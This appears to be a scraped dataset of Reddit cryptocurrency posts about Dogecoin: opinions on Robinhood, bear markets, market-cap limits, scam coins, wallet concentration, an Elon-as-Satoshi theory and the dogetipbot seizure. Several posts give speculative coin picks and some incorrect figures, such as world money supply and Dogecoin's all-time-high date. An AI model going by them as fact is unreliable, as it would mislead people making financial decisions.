*Why transfer out?* If you're not aware, Robinhood restricted trades during the the GameStop/meme-stock mania last year which effectively helped shady hedge funds and hurt regular folk like you and I ([see more about that here](https://www.cnet.com/personal-finance/investing/robinhood-backlash-what-you-should-know-about-the-gamestop-stock-controversy/)). They were also fined $70M by FINRA over other shady practices, including having ""outages"" during big market swings between 2018 and 2020 ([check that out here](https://www.nytimes.com/2021/06/30/technology/robinhood-fined-misleading-customers.html)). This was especially a frustration last year when Robinhood suddenly suffered ""technical difficulties"" during the epic Doge runup ([more info here](https://www.theverge.com/2021/5/4/22419159/robinhood-dogecoin-outage-crypto-trading-crash#:~:text=Robinhood%20confirmed%20that%20it%20experienced,the%20beginning%20of%20the%20day)). So then, it's pretty clear that Robinhood's interests are NOT with you. **Why trust them with your assets when they block you from making financial decisions during critical market movements?**

I'm not the only one in this sub that is alarmed by Robinhood, please see these additional posts and comments from our fellow sub-mates for more information so you can make your own decision:

* [Robinhood locked the buy button when it suited them](https://np.reddit.com/r/CryptoCurrency/comments/lfrslo/reminder_robinhood_blocked_several_stocks_from/)

**EDIT: The chart cuts off at 2016...which is apparently making some people think there was a bear market sometime after 2016. Let's have a look:**

https://preview.redd.it/0us34zsk3jd81.png?width=2108&format=png&auto=webp&s=79de6ff34018315c748a2e743caef0ca3b277c65

**There was no bear market. There was a relatively small crash in 2020 as everyone panicked over Covid. That's not a bear market. This picture also shows you that it's even worse, the market has been absolutely parabolic for almost 2 years.** 

That's the S&P 500 index. Notice something? Every ten years or so there's a severe downward correction which lasts 1-2 years. In the early 2000s it was the tech bubble, in 2008/9 it was the mortgage crisis. As you can see here, we've been in a sharp uptrend for over 10 years now. This uptrend has been fueled not in small part by record low interest rates. This is turn has resulted in parts of the market being hopelessly overvalued, a prime example being Tesla.

Now look at the crypto charts, specifically the top 50 alts. Most of them have had absolutely face melting pumps over the last 18 months. Do you think that's just going to keep going up? Their valuations are now so ridiculous that 'crypto market caps' are basically a meme, completely detached from reality. Of course market caps are hardly ever a true reflection of what company is worth, but they are a reflection of the amount of speculation in the current market. Just to look at a few:

Cardano MC $36 billion, doesn't have fully functional smart contracts, lots of promises while continually underdelivering, if at all.

Solana: MC $30 billion, has been unusable for the last 48 hours, has suffered multiple outages over the last 6 months which lasted up to 17 hours.

Dogecoin: $18 billion MC....don't think I need to go into more detail on this one.

Ethereum: $288 billion market cap, supposed to disrupt the global banking industry (along with everything else), meanwhile it costs $200 for a simple ERC20 token swap.

BTC: $665 billion market cap, supposed to be the future of digital store of value, meanwhile, has lost more than 50% in value over the course of 2.5 months.

etc....

The point is that these market caps aren't a reflection of the current states of those projects, but rather their promised states at some future point in time. Unless that point in time is very close as in a few months away, that's not sustainable. I personally don't think that point in time is very close, as almost nothing in crypto currency works as advertised.

**What would a multi year global bear market mean for crypto?**

\- BTC bleeds more than stock market

\- ETH bleeds more than BTC

\- Alts will bleed even heavier than ETH and a good number will never recover. You have to remember something very basic here: if an alt your holding loses 90% of its value in the bear market, it has to pull a 10X just to get back to its previous price.

**Further complication:**

DCAing into projects is obviously the way to go in a bear market, but it becomes more difficult to predict what projects will have merit the longer the bear market continues. Will your favourite project still be relevant in 2024 or will it be replaced by something that hasn't even launched and won't until 2023? The longer the bear market lasts, the more likely that outcome becomes. Do lots of research, try to keep up with the tech developments in crypto. The next Solana or Luna is probably being planned as I write this. Try to find it.",4280,2022-01-23 22:06:12,1989

DOGE,cryptocurrency,"Elon as Satoshi, Dogecoin's Significance, and the Influence on Financial Systems","Hey everyone,

I've been diving deep into the world of cryptocurrencies and stumbled upon an intriguing theory I wanted to share and discuss with you all.

Key Points:

1. Shared Vision: Both Elon Musk and the creator(s) of Bitcoin advocate for a decentralized financial system.

2. Influence on Dogecoin: Elon's tweets and endorsements have significantly impacted Dogecoin's value and popularity.

3. Cryptic Nature and Twitter Activity: Elon's cryptic tweets about Dogecoin and cryptocurrencies could hint at his involvement as Satoshi.

4. Logo Similarities: The ""X"" in Xs (Twitter) logo similar to original PayPal logo, raising questions about Elon's early interest in digital payments.

5. Early Adoption by PayPal: PayPal's attempt to incorporate Bitcoin earlier than other platforms suggests Elon's early involvement in the crypto space.

6. Leverage Over Traditional Systems: Elon's influence in the crypto market gives him leverage over big corporations and government money, potentially leading to less resistance against decentralized finance.

7. Bitcoin Halving Coincidence: The Bitcoin halving coinciding with DogeDay/4/20 seems too perfect to be a coincidence, possibly emphasizing the significance of Dogecoin and Elon's role as Satoshi.


Discussion:


While there's no concrete evidence to support this theory, the similarities in vision, influence, and the significant impact Elon has on the cryptocurrency market make it an intriguing possibility worth exploring.

I'd love to hear your thoughts! Do you think there's any truth to this theory, or is it just another wild crypto conspiracy?",0,2024-04-02 09:42:04,70

This offers a number of improvements including **multiple bug fixes** and a few **security fixes** for Doge node operators.

Two of the most notable changes are;

1. **Decreased fees by default from 1 Doge per transaction to .01 per kb of data per transaction**. Making it incredibly cheap for Dogecoin transactions. Assuming you conduct 10 transaction a day over the course of a year (3650). Your total amount spent in fees drops from currently $985.50 to $5.75 at a Dogecoin price of $.261. (the cost to maintain the network is sustained through new coin issuance as compared to user fees)
2. **Slightly improved transaction efficiency.**

In addition to this there is a change to facilitate **Miner adaption of the newest upgrade** to help process the lower fees.

DOGE,cryptocurrency,Just because a coin's value is $0.00001 doesn't mean it has room to reach $1,"This post is particularly for those who have little to no idea about Market Cap.

People new to crypto often fall prey to the shillers offering millions of tokens at just $10 or so. The boom of dogecoin and it's peers have just added fuel to the sale of memecoins which are often scams or rugpulls. Even if they aren't, that doesn't mean it's a good investment.

The value and room for growth of any Cryptocurrency is determined by it's Marketcap. The market cap of a token is calculated by multiplying the value of one coin into the total supply of the coin.

If a coin has the value of $0.0001 a piece and the market cap of $100 billion and you buy a million tokens thinking it'll make you a millionaire someday, you are WRONG!
This token will NEVER go to $1. For it to reach $1 the market cap of the crypto would have to be $1 Quadrillion Which is IMPOSSIBLE! Even Bitcoin, the OG, doesn't have that marketcap. 

That being said, while checking the marketcap is important,if the token is deflationary you should check the minimum supply it will have in the future and then calculate it's highest possible growth.

If there is something I need to add or correct, please comment it.

Edit: Market capitalisation is obviously not the only criteria which can help us determine how much a coin's value can grow, but it is a good place to start. There are plenty other things such as total supply and max supply of tokens, fully diluted market cap, volume etc. 
One should always read the token's whitepaper to find all the details, check social media handles of the dev team and the official handle of the token (if they have any).",5353,2021-12-10 07:44:12,1045

For those who are out of the loop, a moonshot is something that has a low probability of becoming extremely successful \[1\].

While it’s definitely nice to be the guy who made the correct play, what I wanted to understand is, how likely are you to pick the next big coin? After all, there are more than [2,400 dead coins](https://www.coinopsy.com/dead-coins/#other) that were part of someone’s moonshot not that long back. When a coin is dead, we would end up losing almost 100% of the capital that we invested in it thereby breaking the cardinal rule of investing.

>*Rule No. 1: Never lose money. Rule No. 2: Never forget rule No. 1 -* ***Warren Buffet***

While Warren Buffet might not be the best example for the crypto world, his advice holds true just as well in all investing spaces - Once you lose your capital, it’s game over. So in this deep-dive, let's see how the less popular cryptos have performed over the years, whether it makes sense to invest in them, and finally, would you have made better returns just by investing in the top cryptocurrencies like Bitcoin and Ethereum?!

### Data & Analysis Methodology

All the data used in the analysis has been collected from coinmarketcap.com. Their data is available going as far back as 2014. I collected the price, market cap, and the symbol for all the coins listed in coinmarketcap on Jan 1st of every year from 2014 to 2022. There were only 67 listed coins in 2014. The list has grown to more than 3,000+ as of Jan 2022. All the data and my analysis are shared as a Rows sheet at the end.

The analysis is fairly simple and I have intentionally made the strategy straightforward so that it’s easy to replicate. We will be comparing the performance of the Top 10 Cryptocurrencies with the next 90 based on the total market cap of the coin.

[The end of 2017 was definitely some wild time to be in the Crypto space.](https://preview.redd.it/ie9owd9mylv81.png?width=895&format=png&auto=webp&s=4830cb8e014e559cb2754b8f514a90a7f1787ac1)

I have limited the analysis to the top 100 coins because of two reasons

1. Even now, close to 95% of the combined market cap of the crypto market is contributed by just the top 100 coins. Adding to this, it becomes more and more difficult/riskier \[2\] to invest in coins having low market cap due to platform and liquidity issues.
2. There are hundreds of new coins that are being launched every day. It’s almost impossible to keep track of all the coins and realistically do proper due diligence before investing. So for practical feasibility, I am limiting it to the top 100.

### Results

Before we jump straight into the return calculation, it’s interesting to see how the crypto market has changed over the years.

https://preview.redd.it/m0fng8moylv81.png?width=649&format=png&auto=webp&s=98fb3edb350696ab03e9136c7b2eaf3ab9f46336

In the first few years where crypto was becoming mainstream (2014 to 2017), the top 10 currencies dominated the overall market cap contributing close to 99% \[3\]. Also, during crashes, we can observe a massive shift in capital allocation from Altcoin to Bitcoin → 2017 was one of the best bull runs (barring 2021) where we can see that Bitcoin only contributed to \~39% of the market cap. But once the bear market set in (2018-19), the allocation to bitcoin proportionally increased until the 2021 bull run.

#### Creating a Crypto Index

To answer our initial question → Whether it’s better to invest in the top 10 most popular cryptos or the other 90 relatively lesser-known ones, we will be creating an equal-weighted index \[4\].

We have two people Alan and Charlie who want to get into the crypto market in 2014, but both are following a slightly different approach.

Alan will invest only in the top 10 most popular currencies. Every new year, he will go and check the top 10 cryptos by Market Cap and then equally invest between the top 10 cryptocurrencies. Charlie, on the other hand, will do the exact same thing with the only difference being that instead of the top 10, he will invest in the 90 next biggest cryptocurrencies.

They continue to do this over the next 8 years and now it’s 2022 and it’s time to see who has performed better.

[Returns shown here are till Jan 1st, 2022](https://preview.redd.it/5u10wctsylv81.png?width=628&format=png&auto=webp&s=aacb02399d50dbd1d1874aba631a97dc354dbaab)

Would you look at that! Alan who has invested in only the top-10 cryptos did vastly better than Charlie who went for the riskier play of investing in the not so well known currencies. The top 10 cryptos on average performed 5x better than the next 90 and 2x better than just investing in Bitcoin. What’s even more interesting is that Charlie would have done 2x better just putting his money in Bitcoin - Ouch!

#### Survival

If you are wondering why Charlie is getting the lowest return in spite of taking the most risk\[5\], it’s because you are forgetting Rule 1 of investing - To not lose your initial investment.

https://preview.redd.it/mmntwr9vylv81.png?width=714&format=png&auto=webp&s=6c69754b5cbf65bc865d87a11ea5116baf9f5a70

The probability of survival of a coin is extremely skewed towards the top 10 currencies. As you can see, over 80% of the top 10 coins from 2014 are still in existence today compared to only 26% of the rest. This trend keeps repeating over the years and your capital would have been decimated. Once it goes to zero, there is no way for it to come back up as any gain on $0 is still 0!

#### Moonshots

Finally, we come to what we are all here for! What are our chances of actually hitting a moonshot following this strategy?

[I have defined a 100x return as a Moonshot](https://preview.redd.it/j8oiifewylv81.png?width=404&format=png&auto=webp&s=fec161da3968b773bb1f96eca3da9c114da48cd9)

Well, your chances of hitting a moonshot are also much higher following the top-10 strategy. Overall, you had a 1 in 10 chance of getting a 10,000% return compared to the 1 in 30 chance of the riskier next-90 strategy.

The above chart also shows another interesting stat → Out of the 500+ cryptos that we analyzed, less than 4% of them ended up becoming a moonshot. Think about that for a min - Of all the cryptos you are likely to hear about (*as there is very less coverage if it’s not in the top 100*), only 3-4% of them end up giving you those insane returns. You have similar chances betting on a single number on the Roulette wheel.

https://preview.redd.it/23hva9qyylv81.png?width=391&format=png&auto=webp&s=9bf4c72e5515d1c77faa01aa82b29eaf590c6289

As you can see, of all our moonshots, Ethereum investment in 2016 ended up returning the most at a whopping 397,548%!

### Limitations

It’s important to understand the limitations of the current analysis before trying to replicate it.

1. **Data** \- As I discussed earlier, all the data is from coinmarketcap and I have assumed a coin is dead if it’s not listed in the following year’s data. This analysis is only as strong as the quality of input data \[6\]. I have done extensive QCs but feel free to play around with the raw data to see if I missed something.
2. **Base Effect** \- The market is considerably different now than it was in 2015-17. There is more awareness as well as penetration. So the future growth might not be as explosive as the one that we observed in the past decade, so you should be realistic about your return potential
3. **Intra Year Returns** \- The current analysis only considers returns based on Jan 1st of every year starting from 2014. If we pick another date within the year, we might get slightly different results as there might have been ATHs and ATLs within the year which we are not capturing.

### Conclusion

>*It's not whether you're right or wrong that's important, but how much money you make when you're right and how much you lose when you're wrong — George Soros*

I started the analysis thinking that investing in the not-so-popular currencies is bound to give better returns as it’s more likely they are undervalued due to lower publicity and hype associated with them.

But, as we saw from the data, in the case of crypto it’s much more profitable just to invest in the top currencies. It’s like the case where being in the game is much more important than trying to hit it big and striking out!

This is why DOGE was nothing else than FOMO and viral investing. This is why DOGE will fall from the Top10. Will it come back? Sure, after crashing to 1 cent, the viral cycle can start again. And it will be temporal again.

15474 transactions. The lowest in almost 4 years, in the middle of a bull run. We had 20-30k transactions in 2018-2020, during the crypto winter.

How many transactions other chain process?

* Cardano 80k
* Bitcoin Cash 100k
* Litcoin 150k
* Avalancha 170k
* Bitcoin 250k
* Tezos 300k
* Ethereum 1.2M
* Algorand 1.3M
* Fantom 1.5M
* Polygon MATIC 5.5M
* Binance Smart Chain 9M
* Solana 15M (not counting votes)

Most of these chains are doing transactions not far away from their ATH. DOGE ATH happened in 2013. 8 years ago!! after that, it had 8 Pumps and 7 dumps. The 8th dump is happening right now. The code is a fork of a fork of Litecoin done in 2013, and it hasnt improved sifnicantly since then. It doesnt have the throughput to be a global payment system. Elon just loves the attention and the marketing points. After being in the media so long time, adoption decreased. Investors multiplied by 10, by almost none of you are actually using it, just investing for the profits. 

Invest as you will, just be aware, that those funds could be lost. Don't invest more you can afford to lose. 

PS: Why do I attack DOGE? Because I think it's a distraction for Crypto and damage its credibility. Hundreds of thousands of people will be burnt in this FOMO, and will distrust crypto in the future. It has provided ammo to skepticals, and the reputation damage will take time to repair. Shiba, RocketCum, and many other shitcoins, are the worst of this space.",4675,2021-09-22 08:52:16,1600

Right now it's sitting at 1/10th of its ATH which, to me at least, could mean that it could 10x again.

I know it's a pretty useless coin, but to be honest the most important aspect of a coin is for it to get **hype**, at least that's how I see it... I mean look at Pepe, everyone, especially mainstream people, sees crypto as coins with pretty logos and they'll invest in whatever they think makes them money, which is why I was thinking of getting a bit of Doge every now and then.

* **In order for the Market Cap (Top Number) to go up, many people would have to buy dogecoin**, but many people understand this is a meme coin or a pump/dump coin.

* **In order for the Circulating Supply (Bottom Number) to go down, they would have to stop mining dogecoin**, but there is 14.4 Dogecoins being produced in one day which is 5 Billion Dogecoin a year.

&#x200B;

* **If you want DogeCoin to be $10** based on the circulating supply we have now, then the **Market Cap would have to be 1.29 Trillion** *(Note: I calculated this several days back, so the number might be even higher now)*, **that's if DOGECOIN STOPPED MINING and NEVER MAKE ANYMORE!**

DOGE,cryptocurrency,"Doge paved way to a lot of scam coins: Beware of SH*T coins like Safemoon, Elongate, safemars, safegalaxy, safe whatever.","I see a lot of safemoon shills on every subreddit, youtube and Facebook. I just don't want to see more people falling for trash projects like these so please beware. The fake bots will already downvote this thread but I am hoping it will at least reach some actual users in here.

Here are a few coins that I looked into that are completely scams but are widely being promoted.

Safemoon, safemars, safegalaxy, elongate, Zepplin dao, ravenX, fox finance, moon pirate, moonrate, hungry bear. Basically any coin which says ""they will give you coins for any transaction on the chain and then will burn x% more"".

The idea of naming it ""Safe"" ""moon"" should be a good enough of a red flag.  Safemoon and these other coins has 1 wallet with more than 50% of the coins. You will see a hoard of fake users/profiles just trying to promote it. These coins have no utility, it is just a ponzi scheme with the entire idea being that people who come in last are gonna be bag holders and everyone below will make a portion of the bagholders investment if you bail out early before the rug pull. These people are trying hard to get you into safemoon etc. because they wanna hoard more money and they don't give a fuck about the people who are gonna be bag holders in the end.

Do not think that lot of people are buying the coins and you are gonna be missing out on 100x gains, majority of the people posting screen shots or talking about their experience are fake profiles.

How they try to entice you?

1. They are going to show their profits
2. They are going to promise exchange listing (Binance, Kucoin, their own exchange) which will never come I promise you.
3. They say they are transparent because they put couple of stooges for some dogshit AMA
4. They come up with some charity cause to make you feel not guilty about being part of a ponzi scheme or play on your good nature in general.
5. They make the coin value be well below 1 dollar like ($0.0000001) so its more enticing to you to get in on, giving you hope that its going to reach 1 dollar someday LOL.

It's mind blowing how some people play these mental gymnastics with themselves  to justify their ponzi scheme. ""I made 100x gains"", ""is it wrong for the little guy to make money"", ""i will put 50% of  profits into legit coins"".

I don't want these shit coins to be the face of crypto for all the new comers. Stop promoting/getting into these scam coins for a quick buck, it is just gonna give crypto space a bad name.

DOGE,cryptocurrency,Will DOGE be worth $100 a coin? Can it become as big as ETH? Could Stellar Lumens be worth $1000 a coin? Will Safemoon make me rich?? We all need to look at total supply vs market cap to manage our expectations and be more logical about what is possible.,"The answer to all of those lofty expectations? Impossible. This is a mistake a lot of people are making. You have to look at total supply and multiply it by price per coin to get the market cap. Let’s look at a few popular ones…

Bitcoin is rare like gold, difficult to mine like gold and is used as a store of value like gold. As it becomes more scarce, it will continue to rise in price. It has a total supply of 21 million, of which 18 million are already circulating. After the 21 million are mined, there will be no more available. 18 million x $57k means it has a market cap of over a trillion dollars. That is huge. The total market cap for ALL crypto is 2.38 trillion. Bitcoin is king. Bigger than Visa and MasterCard combined. Bigger than nearly every world bank. It is the world’s 3rd largest currency. 

Ethereum has a total supply of 115 million. More coins than Bitcoin. At the moment, it allows for 18 million to be mined each year max. In July, they are making a change with the London Hardfork, EIP 1559, and every time a transaction is made with ETH, the ETH fees will be burned, making the supply more limited and much more valuable, similar to BTC. Many are saying that ETH will go up to $10k per coin this year because of these changes. When ETH 2.0 is released next year, the price will probably go much higher. With 115 million in circulation, ETH has a market cap of $400 billion. That’s worth more than all of Walmart. 

So, it is really important to check the coin supply and then multiply that by the price you wish it would go to to make you rich. See if the amount seems realistic or not. 

Let’s look at DOGE. Doge has a total supply of 127 billion coins and a max of 10,000 are mined each day [EDIT: DOGE mints 10,000
coins every *minute*, not every day!]. That’s an additional 5 billion coins each year. If you multiply 127 billion coins the $100 you wish it were per coin, it would have a market cap of $12.7 trillion dollars. There is $37 trillion dollars in the world. Is DOGE worth 1/3 of all the money in the world? The entire economy of the United States is $25.3 trillion. Is it realistic to say a meme coin is worth roughly half the US economy…the largest economy in the world?

Let’s take a look at Stellar Lumens. The max supply is $50 billion. The supply increase is 500 million a year, which alone is 23 times the total amount of BTC each year. Anyway, if it were $1000 per coin, the total market cap would be $50 trillion, more than double the US economy. At the very most, maybe they could be $10 each? I say it could be worth $10 because it has actual utility. I think DOGE would top out at $1, and that would be pretty crazy. 

If DOGE were worth as much as ETH, which I’ve seen people on the doge subreddit think might happen, Doge would be worth a modest $388,720,000,000,000. $388 trillion. That’s at least 3 times all the money in the world economy, if Google serves me right.

Then you have to be really careful of coins that are just a rug pull and get promoted on Tik-Tok, like Safemoon. I don’t even need to do the math on Safemoon to know it’s a scam. They will get people to throw all their money into it and then they cash out their supply and take everyone’s money. The total supply for Safemoon is 1 quadrillion coins!!! Stay away from that. Insanity. 

Look at supply of successful coins beyond BTC and ETH and see if you think they could be worth a lot more in the future. Here are some I think worth investing in:

Polkadot (DOT): Total supply: 935.5 million, total supply 1 billion

Chainlink (LINK): Total supply: 419 million, max 1 billion

Cardano (ADA): Total supply: 45 billion. This coin has many great uses, but will not be worth as much as others simply because of the number of circulating coins. Maybe $10-$12 a coin max? But it is under $2 right now. 

ATOM: Total supply: 248 million. New coins are created each year as rewards for people that hold (stake) ATOM. If you can find a good coin that gives you APR, many are 5-6%…much better than a traditional savings account! 

Algorand (ALGO): 2.96 billion, also releases new coins as rewards to people that hold ALGO. 

Tezos (XTZ), circulating supply: 756 million. Total supply: 763 million. 

MANA: this coin is only used for a video game called Decentraland. Atari is making a casino opening in May in that virtual world. Supply available: 1.5 billion. Total supply: 2.6 billion. 

Polygon (MATIC): 10 billion, half in circulation. Because there is a max supply of 10 billion, if it grew to the size of ETH…which won’t happen…each coin would be worth $35 a coin (Take the market cap of ETH and divide it by the supply of MATIC to see what it would be if it were as huge as ETH). It’s under a dollar now. Maybe it could grow to 1/4 of ETH if we’re being optimistic? That would put it at $8.75 a coin. 

Enjin (ENJ) 1 billion coins max, 834 million circulating. 

The list goes on, I just picked a handful of random coins I hear mentioned a lot, but all you need to do to check out what a realistic expectation for a coin is is to take the current supply of tokens, multiply it by what you wish the coin was worth and compare the market cap to BTC or ETH’s market cap, over a trillion and $400 billion, respectively. I don’t expect any alt coin to be worth as much as those those two. And, it bears repeating, the entire cryptocurrency market is worth 2.38 trillion. If you calculate that your coin at $100 is going to be worth double, triple, or quadruple that, I’d say that’s an impossibility. Likewise, you can do the math the other way to see what your coin would be worth per coin if it were as big as ETH or BTC by simply dividing the market cap for ETH or BTC by the number of coins circulating for your prospective coin. Your coin won’t grow as big as those two, but it’s a good way to visualize it and manage your expectations. 

(Note that some of my supply numbers might be off a little, but they should be in the general ballpark)",15389,2021-05-06 02:01:00,3145

DOGE,cryptocurrency,When the likes of DOGE and SHIB start pumping that's when you know the market is getting frothy. ,"Bitcoin is heading to being up almost 200% over the past year and Ethereum 130%... but look out here come the Alts almost right on cue. 

Like almost every crypto market bullrun in recent history, the pump of BTC and ETH is proceeded by the pump of the Alts... none more so than the meme coins such DOGE and SHIB.

DOGE is up almost 100% in the **past month** and SHIB heading for almost 190%.

Once again  memes will still start flowing on social media, retail will start FOMOing,. your grandmother will start asking you if [insert] dog coin is a good investment. The news will start featuring stories on the latest dog coin millionaire or those that have sold their home, wives and kids to yolo into crapcoin. 

There will be another wave of Finfluencers shilling the latest and greatest scamcoin.  A huge subsection of retail will be partying on the beach.... when suddenly something happens... a Silk Road,  Mt Gox, China Ban, FTX etc that sees the tide go out. 

Again all that will be left on dry land, although somewhat battered and bruised will be BTC and ETH. Another chunk of retail will be left drowning at sea.. most likely ending up as salty no-coiners hating on the ""scam"" that is crypto.

Here's a chance to save yourselves. Don't do it. Just keep on DCA'ing into BTC and ETH and when crypto becomes greater than 10% of your net savings pot take profit. 

**Edit/update:**

Since this post SHIB is up 45% in the past 24hrs and has gone top ten by marketcap according to CMC. There's now two dog coins in the top ten which I believe is a first in crypto history. Together they currently have a combined market cap of almost $50bn.

DOGE,cryptocurrency,"Theory: Memecoins that have had substantial pumps like DOGE will never reach their ATH again because memecoin investors want ""the next DOGE"", not DOGE","This may be a controversial opinion and I'll probably get several ""remind me in X years"" comments so people can come laugh at me if I'm wrong, but I really believe this. We all know that memecoins like DOGE have pumped and made many people rich. That's why people invest in memecoins, because it's a potential goldmine if you get in early with the right one. However, once a memecoin pumps, how will they attract new investors if they think the main pump has already happened? 

This has already happened with SHIB. Why did so many people invest in SHIB? Because they saw what happened with DOGE and bought into what they believed was ""the next DOGE"", a new memecoin with a growing community that they thought could ""do what DOGE did"". And they were right! The early investors have made a lot of money with SHIB. However, after the BIG pump is over, do new investors want the coin that has already had the big pumps, or the newest memecoin that has the potential to do what that memecoin did? 

Memes die, and so do memecoins. How often do you see Ugandan Knuckles memes anymore? The kind of people who invest in memecoins are  trying to find ""the next DOGE"" or ""the next SHIB"", not DOGE or SHIB. So once new investors believe that the project has already had its big pump, they move on to the next one. Because anyone looking to invest in memecoins for the big money gains will invest into the newly rising memecoin that has yet to pump, not that ones that have already had their day.",6817,2021-12-25 14:35:19,1475
DOGE,cryptocurrency,Doge has a single wallet with more than 23.17% of all the Dogecoin in circulation and it can be rugpulled at ANY moment.,"For comparison, the largest Bitcoin wallet is the Binance coldwallet and it holds approximately 1.40% of the current circulating supply while the largest Ethereum wallet is the  Eth2 Deposit Contract which holds 7.6% of all Ethereum.

The largest Dogecoin wallet, which currently holds $5 Billion in Doge of its $21 Billion market cap is very mysterious. It was thought to be Robinhood or some other exchange but that has previously been dismissed by the Robinhood CEO himself.

[Doge wallet with 23.17&#37; of the entire circulating supply](https://preview.redd.it/go0edwi8nic81.png?width=1436&format=png&auto=webp&s=67d99e6b36c56bcf24470f6676421f98dee70f4f)

Any wallet that holds over 23.17% of the current supply has more than enough to rug pull an entire coin to near zero. Even half of that can cause the price to crash to unrecoverable levels due to how liquidity and market caps work.

According to Forkast,

>For new cryptocurrencies, if the top 10 wallets hold **more than 20% of the** token, or worse, a large percentage of the token is held in a single wallet, then this is a dangerous sign of a potential rug pull.

**For Doge, the top 14 wallets own  46.11% of all Dogecoin.**

TLDR: Avoid any Cryptocurrency that has wallets capable of rug pulling the entire project. Don't let a false sense of security take over just because Doge is popular. It still does not make Doge immune to rugpulls. Never let yourself be at the mercy of a single wallet.

EDIT: The amount of people on the comments claiming it to be the Robinhood wallet DESPITE Robinhood's CEO publicly stating the company does not hold that much Doge as far back as May is the same argument Shib shillers make.

15474 transactions. The lowest in almost 4 years, in the middle of a bull run. We had 20-30k transactions in 2018-2020, during the crypto winter.

How many transactions other chain process?

* Cardano 80k
* Bitcoin Cash 100k
* Litcoin 150k
* Avalancha 170k
* Bitcoin 250k
* Tezos 300k
* Ethereum 1.2M
* Algorand 1.3M
* Fantom 1.5M
* Polygon MATIC 5.5M
* Binance Smart Chain 9M
* Solana 15M (not counting votes)

Most of these chains are doing transactions not far away from their ATH. DOGE ATH happened in 2013. 8 years ago!! after that, it had 8 Pumps and 7 dumps. The 8th dump is happening right now. The code is a fork of a fork of Litecoin done in 2013, and it hasnt improved sifnicantly since then. It doesnt have the throughput to be a global payment system. Elon just loves the attention and the marketing points. After being in the media so long time, adoption decreased. Investors multiplied by 10, by almost none of you are actually using it, just investing for the profits. 

Invest as you will, just be aware, that those funds could be lost. Don't invest more you can afford to lose. 

PS: Why do I attack DOGE? Because I think it's a distraction for Crypto and damage its credibility. Hundreds of thousands of people will be burnt in this FOMO, and will distrust crypto in the future. It has provided ammo to skepticals, and the reputation damage will take time to repair. Shiba, RocketCum, and many other shitcoins, are the worst of this space.",4673,2021-09-22 08:52:16,1600

DOGE,cryptocurrency,"Doge may be a memecoin, but it brought me to this community and made me invest in other crypto.","Back in february when the whole GME hype started, I saw a couple threads popping up that the Dogecoin comminity is planning to rise as well. It was too late for me to invest in GME as it already spiked, so I tried my luck with Doge and bought at 0.05€ for 50€. Not to be too risky with my first investment ever... 2 months later I cashed out (a bit too early) and made about 180€. So my total wallet was now €230, which I planned to invest in Doge again once the price dropped. 

Luckily the price stayed up and I realized that if I'd put my money back in Doge, I would only lose. Either the price stays up and I end up with less doge than I initially had or I buy when the price drops and end up with less € if it continues to drop. 

So I started looking for alternatives to invest my winnings. I searched for other ""cheap"" coins, that had a lot of potential to grow, by reading this subreddit and came across VET and ADA.  I gained some confidence by profiting from the doge investment and deposited another €500 into my wallet. I put €300 into VET and 350€ into ADA. I might put the remaining €80 back into Doge. It's an unpredictable meme after all, so who knows what happens. 

I'm planning to create a more diverse portfolio if my current investment works somewhat out. Doge might not be the most popular among the altcoins  in this sub, but it was a great starting point for me and made me interested in other crypto currencies.

Bitcoin, ETH and a lot of other top alts are on the same discount as them with the difference their value actually comes from the tech behind it. Memecoins value is more hype, fun and memes but I would rather put money into the next Memecoin then one that already peaked and will most likely only perform as good as “normal” cryptocurrencies.

Curious why people still buy those instead of the next big meme that can peak next bull run or other top alts with the same reward

DOGE,cryptocurrency,To all the people spreading blatantly false info about Doge; STOP; you're hurting the bigger cause,"NO Doge is not like BTC

There is no limited supply. It was specifically intended to remain cheap to facilitate FAST txns. Raising the price directly conflicts with this ~~and will likely result in an influx of new coins into circulation.~~ *Doge is designed to add a fixed supply of new coins to the ecosystem on a constant basis to deflate the price continually*. **THE SUPPLY IS NOT LIMITED, UNLIKE BTC.**

&#x200B;

NO the situation with Doge is not like GME in ANY WAY.

GME happened because of SHORTS. AFAIK ~~this is not something that exists in the crypto world~~ ""suits"" aren't shorting Doge. You are relying on other (retail, most likely) investors to take your bags when the shit hits the fan.  This is not screwing over wallstreet or investment firms in any perceivable way. They don't give a shit about Doge, and they sure as shit don't have short positions, the entire catalyst to the price increase with GME, forcing them to buy down the road.

&#x200B;

NO you are not helping crypto by supporting a pump and dump.

A LOT of new eyes are on crypto lately. If their first experience is holding bags after being sold a lie on a pump and dump (could be called a pyramid) scheme, they will most likely come away with a horrible impression of crypto as a whole.

&#x200B;

NO I'm not a hater

Now is the time to prove a point, a point bigger than money. This is why GME was so pivotal, it is taking money from the rich fuckers who have gamed the system for so long with no downsides. That is not the same situation with Doge, a coin no reasonable corporate investor would ever take interest in. Despite how much the doge folk like to talk about Elon's mention of the coin, he made a few off hand remarks, and a week later changes his twitter bio to say #BITCOIN NOT #DOGE. Why would he do that if he was so sold on the idea? I don't even care if you pump and dump, but the MASSIVE amount of hype you're building, preying on ignorant retail investors, is concerning.

&#x200B;

I'm prepared for a massive backlash, but I'm fairly certain anyone who has done their research knows Doge is nothing but a shitcoin to be used for pump and dump (it fails at its intended purpose), kind of like MEME. It's quite literally a meme coin.

&#x200B;

If you want to hype a coin, maybe try one with an actual use-case and limited supply.

&#x200B;

Edit: correction about new coin generation and shorting. the supply of new coins is fixed and is not directly related to the price, however the intention of DOGE is to be remain a (relatively) cheap currency,  which is why the supply is inflationary. I am not an expert and still have a lot to learn myself, but what I watched happen with DOGE was the same thing I watched happen to many shitcoins (including DOGE) in 2017, and empathize with my past self I wanted to spread the word for new eyes. MEME went 15x the same night DOGE went 4x BTW, for anyone that missed it.

DOGE,cryptocurrency,"Back in the day on Reddit dogecoin tipping bot was popular and Redditors used it to tip others.

Some users even at that point had over $500 of Doge on their balance.

This is the post the creator of dogecoin tip bot made to justify his actions: https://np.reddit.com/r/dogecoin/comments/69vycc/important_im_taking_dogetipbot_to_a_server_farm/

 So in the whole post he did not really even fully apologize to people, but it felt like that post was made more as an attempt to feel sorry for him. As if he was close to bankruptcy, had to layoff some workers (all types of excuses) so had to take all of the doge from the balances. Exact amount of Doge that was there was 108,911,472.26171964 DOGE from 84,671 accounts in total. That means average user had on balance around 1300 DOGE. That would've been worth over $900 during its ATHs.

A lot of users had pretty huge balances on the dogecointipbot that they did not withdrew which were just wiped out aka stolen by the creator, so they must have felt a great amount of anger when May 2021 hit and Doge reached heights of over $0.7. Some folks had more than 100k Doge on their balances that they thought was safe, and that the person running the dogecointipbot was trustworthy. A lot of that stolen money could have been life changing to people that this was stolen from.

